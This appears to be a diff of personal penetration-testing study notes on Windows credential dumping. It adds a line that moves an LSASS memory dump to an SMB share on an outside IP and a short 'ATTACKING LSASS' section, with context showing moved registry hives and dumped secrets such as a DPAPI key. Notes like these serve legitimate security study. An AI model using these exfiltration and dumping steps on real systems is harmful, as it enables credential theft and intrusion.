@@ -94,7 +94,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 #### Moving Hive Copies to Share
 
 ```cmd-session
-C:\> move sam.save \\110.10.14.159\regfile
+C:\> move lsass.DMP \\110.10.14.159\lsass
         1 file(s) moved.
 
 C:\> move security.save \\110.10.14.159\regfile
@@ -140,4 +140,14 @@ dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
 NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
 [*] Cleaning up... 
 ```
+
+
+# ATTACKING LSASS
+
+  - lsass.exe always running
+  - After a user logs in: lsass stored cahce creds , access tokens and other stuffs
+
+#### Dumping LSASS Process Memory
+
+![[Pasted image 20250104173810.png]]
 
